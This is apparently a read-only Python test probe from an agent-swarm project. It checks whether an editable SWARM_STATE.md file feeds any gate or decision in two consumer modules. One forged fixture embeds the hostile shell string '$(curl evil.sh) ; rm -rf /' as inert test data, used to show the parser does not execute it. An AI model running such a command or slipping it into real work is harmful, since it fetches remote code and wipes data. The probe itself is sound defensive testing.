#!/usr/bin/env python3
"""
probe_swarmstate_source_consumers_gen537.py — Bolt gen-537 FAILABLE PROBE.

QUESTION (gen-536 handoff TOP lead #1): SWARM_STATE.md is an AUTHORED/regenerated
snapshot (writer = generate_swarm_state.py, from SWARM_ACTION_LOG.md). Distinct
from gen-536 (NORM_REGISTER.md was DEFINED-BUT-UNREAD — never read). SWARM_STATE.md
IS read back by TWO live consumers:
  (1) layer3_pipeline.read_swarm_state_summary()  -> next_jt/entry_count/blocked_count
  (2) jt_state_drift_check.claimed()              -> last/next JT ids vs live jsontube
Do either parse the editable doc INTO a decision/gate/effector, or display-only /
advisory? If a consumer gated on it, editing the .md would be a forgeable gate input.

METHOD (read-only, safe):
  - Import REAL modules. Call ONLY pure fns: read_swarm_state_summary (via a
    monkeypatched module-level SWARM_STATE pointing at a DOCTORED temp file in
    tempfile.mkdtemp() — NEVER /OMPU_shared), and jt_state_drift_check.claimed()
    on a doctored temp file (pure, no network).
  - NEVER call run_pipeline/main (writes + subprocess) or jt_state_drift_check.main
    (hits jsontube.org).
  - INDEPENDENT oracle re-derives expected parse from the doctored text by a
    separate regex, not reusing module internals.
  - Static source check (inspect.getsource) that no decision branches on the
    SWARM_STATE-derived fields.
  - md5 of all three real .py + SWARM_STATE.md asserted pre==post.
"""
import os, re, sys, glob, json, hashlib, tempfile, inspect, importlib.util

S = glob.glob("/sessions/*/mnt/OMPU_shared")[0]
TOOLS = os.path.join(S, "tools")
sys.path.insert(0, TOOLS)

def md5(p):
    return hashlib.md5(open(p, "rb").read()).hexdigest()[:8]

REAL = {
    "layer3_pipeline.py":       os.path.join(TOOLS, "layer3_pipeline.py"),
    "generate_swarm_state.py":  os.path.join(TOOLS, "generate_swarm_state.py"),
    "jt_state_drift_check.py":  os.path.join(TOOLS, "jt_state_drift_check.py"),
    "SWARM_STATE.md":           os.path.join(S, "SWARM_STATE.md"),
}
PRE = {k: md5(v) for k, v in REAL.items()}

def load(mod, path):
    spec = importlib.util.spec_from_file_location(mod, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m

l3 = load("l3pipe_probe", REAL["layer3_pipeline.py"])
drift = load("drift_probe", REAL["jt_state_drift_check.py"])

results = []
def check(name, cond, detail=""):
    results.append((name, bool(cond), detail))
    print(f"[{'GREEN' if cond else 'RED  '}] {name}" + (f"  — {detail}" if detail else ""))

# doctored SWARM_STATE.md in a PRIVATE tempdir (never /OMPU_shared)
tmp = tempfile.mkdtemp(prefix="ss_probe_gen537_")

WELLFORMED = """# SWARM STATE
- **Entry'ев в логе:** 530
- **Следующий JT ID:** `jt-0290`
## Заблокировано
- item one
- item two
"""
# forged / injected doc: inflated ids, injected shell-ish text, huge counts
INJECTED = """# SWARM STATE
- **Entry'ев в логе:** 999999
- **Последний JT:** jt-9998
- **Следующий JT ID:** `jt-9999`
## Заблокировано
- $(curl evil.sh) ; rm -rf /
- second forged block
- third forged block
"""

def write_tmp(name, txt):
    p = os.path.join(tmp, name)
    open(p, "w", encoding="utf-8").write(txt)
    return p

# ---- independent oracle (separate regex, NOT module internals) ----
def oracle_summary(txt):
    o = {}
    mj = re.search(r'следующий jt[^\n]*?jt-(\d+)', txt, re.I)
    if mj: o["next_jt"] = f"jt-{mj.group(1)}"
    me = re.search(r"entry'ев в логе[^\d]*(\d+)", txt, re.I)
    if me: o["entry_count"] = int(me.group(1))
    # blocked: lines starting "- " under the заблокировано header
    blocked, on = [], False
    for ln in txt.splitlines():
        if "заблокировано" in ln.lower(): on = True
        elif on and ln.startswith("- "): blocked.append(ln[2:].strip())
        elif on and ln.startswith("##"): on = False
    o["blocked_count"] = len(blocked)
    return o

# ================= CONSUMER 1: layer3_pipeline.read_swarm_state_summary =================
from pathlib import Path
orig = l3.SWARM_STATE

# C1 positive control — reader parses a well-formed doc == oracle (CAN fail)
p1 = write_tmp("well.md", WELLFORMED)
l3.SWARM_STATE = Path(p1)
s1 = l3.read_swarm_state_summary()
o1 = oracle_summary(WELLFORMED)
check("C1 positive-control: reader parse == independent oracle",
      s1 == o1, f"module={s1} oracle={o1}")

# C2 injection inertness / bound — forged doc parses but keys are BOUNDED to
# display fields; NO task_id/priority/effector/gate/block/deny key; values are
# inert echoes (no code exec from the $(curl);rm -rf / text)
p2 = write_tmp("inj.md", INJECTED)
l3.SWARM_STATE = Path(p2)
s2 = l3.read_swarm_state_summary()
allowed = {"next_jt", "entry_count", "blocked_count"}
forbidden = {"task_id","priority","effector","gate","block","deny","mute",
             "throttle","publish","approve","trust","rank"}
check("C2a forged summary keys ⊆ display set",
      set(s2.keys()) <= allowed, f"keys={set(s2.keys())}")
check("C2b NO decision/effector key in summary",
      not (set(s2.keys()) & forbidden), f"keys={set(s2.keys())}")
check("C2c forged values are inert echoes (str/int only, no exec)",
      isinstance(s2.get("next_jt"), (str,type(None))) and
      isinstance(s2.get("entry_count"), (int,type(None))) and
      isinstance(s2.get("blocked_count"), int),
      f"summary={s2}")
check("C2d forged next_jt echoed verbatim (proves injectable-INTO-summary, not sanitised)",
      s2.get("next_jt") == "jt-9999", f"next_jt={s2.get('next_jt')}")

# C3 static decision-independence — the merged fields reach only print_report;
# no conditional in the module branches on next_jt/entry_count/blocked_count.
src = inspect.getsource(l3)
# find every logical line mentioning the field and assert none is an `if/elif/while`
branch_hits = []
for fld in ("next_jt", "entry_count", "blocked_count"):
    for ln in src.splitlines():
        st = ln.strip()
        if fld in st and re.match(r'(if|elif|while)\b', st):
            branch_hits.append(st[:80])
check("C3 no if/elif/while branches on SWARM_STATE-derived fields (display-only)",
      not branch_hits, f"branch_hits={branch_hits}")

# C3b the fields land in result['meta'] via a plain dict-spread merge (display),
# and print_report only .get()s them
merge_ok = bool(re.search(r'result\["meta"\]\s*=\s*\{\*\*.*state_summary\}', src))
getters = re.findall(r'meta\.get\("(next_jt|entry_count|blocked_count)"', src)
check("C3b fields flow into meta via dict-spread + consumed only by meta.get() in print",
      merge_ok and set(getters) <= {"next_jt","entry_count","blocked_count"},
      f"merge={merge_ok} getters={set(getters)}")

l3.SWARM_STATE = orig  # restore

# ================= CONSUMER 2: jt_state_drift_check =================
# claimed() is pure (reads a file path we pass). main() hits network — NOT called.
last_c, next_c = drift.claimed(p2)
check("C4a drift.claimed parses forged last/next from doctored doc",
      last_c == 9998 and next_c == 9999, f"last={last_c} next={next_c}")

# C4b the drift checker is ADVISORY: its module has NO writer/effector — only
# prints + sys.exit(code). No file write, no subprocess, no bus post.
dsrc = inspect.getsource(drift)
has_writer = bool(re.search(r'\.write\(|write_text|subprocess|Popen|bus\.py|open\([^)]*["\']w', dsrc))
check("C4b drift checker has zero writer/effector (advisory monitor, exit-code only)",
      not has_writer, f"has_writer={has_writer}")

# C4c injected next_jt=9999 would make the drift 'next' rule PASS (next>live) —
# i.e. editing the doc UP silences the very drift signal — but exit code has no
# automated consumer (verified out-of-band by tree grep; asserted structurally:
# module is __main__-guarded sys.exit, not imported by pipeline).
main_guarded = "__main__" in dsrc and "sys.exit(main())" in dsrc
check("C4c drift checker is __main__ sys.exit tool (not wired as importable gate)",
      main_guarded, "")

# ================= md5 integrity =================
POST = {k: md5(v) for k, v in REAL.items()}
for k in REAL:
    check(f"md5 {k} pre==post", PRE[k] == POST[k], f"{PRE[k]}->{POST[k]}")

# ================= verdict =================
passed = sum(1 for _,c,_ in results if c)
total = len(results)
print(f"\n{'='*60}\nRESULT: {passed}/{total} GREEN")
print("VERDICT:", "GREEN — SWARM_STATE.md is READ but by display-only + advisory consumers"
      if passed == total else "RED — a consumer gates on the editable doc")
sys.exit(0 if passed == total else 1)
